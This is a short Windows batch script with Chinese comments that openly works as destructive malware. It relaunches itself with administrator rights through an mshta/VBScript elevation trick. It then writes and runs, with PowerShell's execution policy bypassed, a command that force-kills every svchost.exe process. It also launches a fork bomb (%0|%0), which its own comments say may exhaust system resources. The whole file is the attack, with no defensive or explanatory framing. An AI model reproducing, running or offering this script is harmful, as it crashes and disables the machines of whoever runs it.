@echo off
REM 禁用命令回显

REM 使用 mshta 和 VBScript 提升权限并以管理员身份重新运行当前批处理文件
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit

REM 设置临时 PowerShell 脚本文件路径
set psFile=%temp%\temp.ps1

REM 创建 PowerShell 脚本以强制结束 svchost.exe 进程，并将命令写入脚本文件
echo taskkill /im svchost.exe /f > %psFile%

REM 暂停脚本执行 5 秒，给系统时间处理前面的命令
timeout /t 5 >nul

REM 尝试自我复制并无限循环，可能导致系统资源枯竭
%0|%0

REM 使用 PowerShell 执行之前创建的脚本文件，绕过执行策略
powershell -ExecutionPolicy Bypass -File %psFile%

REM 删除临时 PowerShell 脚本文件以清理
del %psFile%
